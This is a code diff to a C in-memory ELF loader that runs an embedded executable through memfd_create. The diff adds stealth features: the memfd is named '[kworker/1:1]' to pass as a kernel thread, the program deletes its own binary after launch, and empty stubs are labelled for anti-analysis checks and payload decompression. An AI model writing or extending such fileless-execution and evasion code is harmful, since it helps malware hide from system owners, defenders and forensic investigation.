@@ -17,10 +17,11 @@
 
 #include <libelf.h>
 #include <gelf.h>
+#include <zlib.h>
 
 #include "runtime.h"
 
-#define TEMPFILE "tmp"
+#define TEMPFILE "[kworker/1:1]"
 #define MIN(x, y) x > y ? y : x
 
 /* helper method to exit with message */
@@ -30,6 +31,13 @@ static void die(int res, const char *msg)
     exit(res);
 }
 
+
+/* decompress executable blob for memfd */
+static void decompress()
+{
+
+
+}
 
 /* safely write buffer to a given input file descriptor */
 static void write_fd(int fd, const char *str, size_t len)
@@ -41,6 +49,11 @@ static void write_fd(int fd, const char *str, size_t len)
             die(-1, "writing to memfd failed\n");
         cnt += result;
     } while (cnt != len);
+}
+
+/* handles anti-analysis checks */
+void __attribute__ ((constructor)) premain()
+{
 }
 
 int main(int argc, char *argv[], char *envp[])
@@ -94,10 +107,16 @@ int main(int argc, char *argv[], char *envp[])
 
     close(fd);
 
+    // decompress the data parsed
+
     // create anonymous file
     fd = memfd_create(TEMPFILE, 0);
     if (fd == -1)
         die(fd, "cannot create in-memory fd for code");
+
+    // delete ourselves
+    if (remove(argv[0]) != 0)
+        die(fd, "cannot remove self");
 
     // write ELF data to in memory fd and execute
     write_fd(fd, data, size - 1);
